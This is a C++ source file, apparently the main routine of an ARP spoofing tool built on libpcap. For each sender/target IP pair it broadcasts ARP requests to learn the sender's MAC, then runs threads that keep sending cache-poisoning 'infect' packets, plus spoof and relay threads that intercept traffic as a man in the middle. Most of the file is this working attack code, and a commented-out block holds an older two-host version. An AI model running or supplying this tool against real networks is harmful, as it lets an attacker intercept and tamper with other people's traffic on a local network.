// todo header chore
#include <pcap.h>
#include "send.h"
#include "mac.h"
#include "ip.h"
#include <pthread.h>
#include <unistd.h>

#include <iostream>
#include <csignal>

#include <queue>
#include <map>

#define PACKET_SLEEP_INTERVAL 5
#define PACKET_INFECT_INTERVAL 60

pcap_t *handle;

struct SendArpParam
{
    int *t;
    EthArpPacket packet;
};

void *threadSendArp(void *param)
{
    SendArpParam *s = (SendArpParam *)param;
    int cond = 0;
    while (!cond)
    {
        cond = *s->t;
        s->packet.send(handle);
        sleep(PACKET_SLEEP_INTERVAL);
    }
    printf("arp send end\n");
};

// void* t_infect()
void *threadInfect(void *param)
{
    EthArpPacket *inf_pkt = (EthArpPacket *)param;
    while (1)
    {
        inf_pkt->send(handle);
        sleep(PACKET_INFECT_INTERVAL);
    }
}

int main(int argc, char const *argv[])
{
    if (argc < 4 || argc % 2 == 1)
    {
        usage();
        return -1;
    }
    int schedule = (argc - 2) / 2;

    Mac attackerMac;
    Ip attackerIp;
    getDeviceAddress(argv[1], &attackerIp, &attackerMac);
    printf("attacker ip %s\n", std::string(attackerIp).c_str());
    printf("attacker mac %s\n", std::string(attackerMac).c_str());

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
        return -1;
    }

    // Ip senderIp = Ip(const_cast<char *>(argv[2]));
    // Ip targetIp = Ip(const_cast<char *>(argv[2 + 1]));

    int received[schedule];

    pthread_t bc_threads[schedule];
    pthread_t inf_threads[schedule];
    pthread_t spoof_threads[schedule];
    pthread_t producer;

    pthread_mutex_t pipe_m[schedule];
    pthread_cond_t pipe_c[schedule];

    pthread_attr_t attr;
    if (int err = pthread_attr_init(&attr))
        fprintf(stderr, "couldn't pthread_attr_init error with %d\n", err);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

    std::queue<Ip> args;
    std::map<Ip, Mac> table;

    for (int i = 2; i < argc; i += 2)
    {
        args.push(Ip(const_cast<char *>(argv[i])));
        args.push(Ip(const_cast<char *>(argv[i + 1])));
    }

    for (int i = 0; i < schedule; i++)
    {
        Ip senderIp = args.front();
        args.pop();
        Ip targetIp = args.front();
        args.pop();

        Mac senderMac;

        EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
        SendArpParam p = {&received[i], bc_pkt};
        printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
        if (int err = pthread_create(&bc_threads[i], &attr, threadSendArp, &p) != 0)
            printf("thread A create fail : %d\n", err);

        senderMac = receiveArpReply(handle, senderIp, &received[i]);
        table.insert({senderIp, senderMac});
        printf("sender mac address get : %s\n", std::string(senderMac).c_str());

        EthArpPacket inf_pkt = EthArpPacket::infectPacket(attackerMac, senderMac, senderIp, targetIp);
        if (int err = pthread_create(&inf_threads[i], &attr, threadInfect, &inf_pkt) != 0)
            printf("thread A create fail : %d\n", err);
        printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());

        args.push(senderIp);
        args.push(targetIp);
    }

    for (int i = 0; i < schedule; i++)
    {
        Ip senderIp = args.front();
        args.pop();
        Ip targetIp = args.front();
        args.pop();
        Mac senderMac = table.at(senderIp);
        Mac targetMac = table.at(targetIp);

        pthread_mutex_init(&pipe_m[i], NULL);
        pthread_cond_init(&pipe_c[i], NULL);
        registerMac(senderMac, &pipe_c[i], &pipe_m[i]);

        SpoofParams sp = {handle, attackerMac, senderMac, targetMac};
        if (int err = pthread_create(&spoof_threads[i], &attr, spoof, &sp) != 0)
            printf("thread e create fail : %d\n", err);
        printf("spoofing %s -> %s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());
    }

    ProduceParam pparam = {handle, attackerMac};
    if (int err = pthread_create(&producer, NULL, producePacket, &pparam) != 0)
        printf("thread producer fail : %d\n", err);
    printf("producer thread start\n");

    signal(SIGINT, NULL);
    while (true)
    {
        printf("main thread...\n");
        sleep(10);
    }

    return 0;
}

// void *threadSendArp(void *param)
// {
//     EthArpPacket *bc_pkt = (EthArpPacket *)param;
//     while (!received)
//     {
//         bc_pkt->send(handle);
//         sleep(PACKET_SLEEP_INTERVAL);
//     }
//     printf("arp send end\n");
// };

// void *threadSendArp2(void *param)
// {
//     EthArpPacket *bc_pkt = (EthArpPacket *)param;
//     while (!received2)
//     {
//         bc_pkt->send(handle);
//         sleep(PACKET_SLEEP_INTERVAL);
//     }
//     printf("arp send end\n");
// };

// EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
// SendArpParam p = {&received[0], bc_pkt};
// printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
// if (int err = pthread_create(&bc_threads[0], &attr, threadSendArp, &p) != 0)
//     printf("thread A create fail : %d\n", err);

// Mac senderMac = receiveArpReply(handle, senderIp, &received[0]);
// printf("sender mac address get : %s\n", std::string(senderMac).c_str());

// EthArpPacket inf_pkt = EthArpPacket::infectPacket(attackerMac, senderMac, senderIp, targetIp);
// if (int err = pthread_create(&inf_threads[0], &attr, threadInfect, &inf_pkt) != 0)
//     printf("thread A create fail : %d\n", err);
// printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());

// EthArpPacket bc_pkt1 = EthArpPacket::broadcastPacket(attackerMac, attackerIp, targetIp);
// SendArpParam p1 = {&received[1], bc_pkt1};
// printf("broadcast packet sending to target %s...\n", std::string(targetIp).c_str());
// if (int err = pthread_create(&bc_threads[1], &attr, threadSendArp, &p1) != 0)
//     printf("thread A create fail : %d\n", err);

// Mac targetMac = receiveArpReply(handle, targetIp, &received[1]);
// printf("target mac address get : %s\n", std::string(targetMac).c_str());

// EthArpPacket inf_pkt1 = EthArpPacket::infectPacket(attackerMac, targetMac, targetIp, senderIp);
// if (int err = pthread_create(&inf_threads[1], &attr, threadInfect, &inf_pkt1) != 0)
//     printf("thread A create fail : %d\n", err);
// printf("infect thread opened to target %s...\n", std::string(targetIp).c_str());

// //-----

// ProduceParam pparam = {handle, attackerMac};
// if (int err = pthread_create(&producer, NULL, producePacket, &pparam) != 0)
//     printf("thread producer fail : %d\n", err);
// printf("producer thread start\n");

// pthread_mutex_init(&pipe_m[0], NULL);
// pthread_cond_init(&pipe_c[0], NULL);
// registerMac(senderMac, &pipe_c[0], &pipe_m[0]);

// pthread_mutex_init(&pipe_m[1], NULL);
// pthread_cond_init(&pipe_c[1], NULL);
// registerMac(targetMac, &pipe_c[1], &pipe_m[1]);

// SpoofParams sp = {handle, attackerMac, senderMac, targetMac};
// if (int err = pthread_create(&spoof_threads[0], &attr, spoof, &sp) != 0)
//     printf("thread e create fail : %d\n", err);
// printf("spoofing %s -> %s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());

// // sender <-> target exact

// SpoofParams sp2 = {handle, attackerMac, targetMac, senderMac};
// if (int err = pthread_create(&spoof_threads[1], &attr, spoof, &sp2) != 0)
//     printf("thread f create fail : %d\n", err);
// printf("spoofing %s -> %s\n", std::string(targetIp).c_str(), std::string(senderIp).c_str());

// signal(SIGINT, NULL);
// // temp
// while (true)
// {
//     printf("main thread...\n");
//     sleep(10);
// }